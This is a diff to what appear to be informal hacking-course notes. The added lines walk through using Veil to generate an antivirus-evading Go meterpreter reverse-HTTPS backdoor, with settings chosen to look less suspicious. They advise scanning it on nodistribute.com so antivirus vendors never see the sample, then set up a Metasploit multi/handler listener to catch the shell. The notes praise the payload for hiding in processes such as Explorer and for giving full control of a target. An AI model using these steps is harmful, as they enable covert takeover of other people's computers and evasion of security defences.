@@ -895,10 +895,30 @@ an unattened installed so basically it will install every thing with it's defaul
 -> ./Veil.py //this will start the Veil
 - now u will see the main cmds on the screen such as info, list, update etc
 - enter "list" in option then we have to choose option 1 "Evasion" so enter "use 1"
-- list
+- cmd -> list
 - syxtax for payload as -> go/meterpreter/rev_https.py // go represents the programming language the target computer understand
-  , meterpreter represents the type of the code to be executed on the target computer and the meterpreter runs in the memory
+  , meterpreter represents the type of the code to be executed on the target computer and the meterpreter runs in the memory and it
+  allows us to migrate between system processes so we can have the payload or backdoor running from normal process like Explorer
+  from example and this payload allow us to gain full control over the target system and even use target computer to hack other
+  computers etc and as it is running from memory it makes it hard to detect and doesn't leave a lot of footprints, rev_https is the
+  method used to establish the connection
+- cmd -> use 15
+- cmd -> set LHOST ip
+- cmd -> set LPORT 8080 // use 8080 bcz it is used by most of the servers and makes the connection less suspicious
+- cmd -> set PROCESSORS 1 // To make the code bit different and less suspious
+- cmd -> set SLEEP 6 	// it makes the backdoor sleep for a no of seconds before executing the payload 
+- cmd -> generate // then name the payload and u will get the locations where the payload has been generated
 
+Note -> do not use virus total bcz it share the results with anti virus programs hence use the website -> nodistribute.com and then
+	go to the option Scan a file, upload the file and click button 'scan file'
+	remember to update Veil everytime u use it bcz anti virus r updated regularly and also veil is updated regularly
+	
+- cmd -> msfconsole
+	> use exploit/multi/handler
+	> set PAYLOAD windows/meterpreter/reverse_https
+	> set LHOST ip
+	> set LPORT 8080
+	> exploit // and the listening will start
 
 --------------------------------------------------------------------------------------------------------------------------------
 
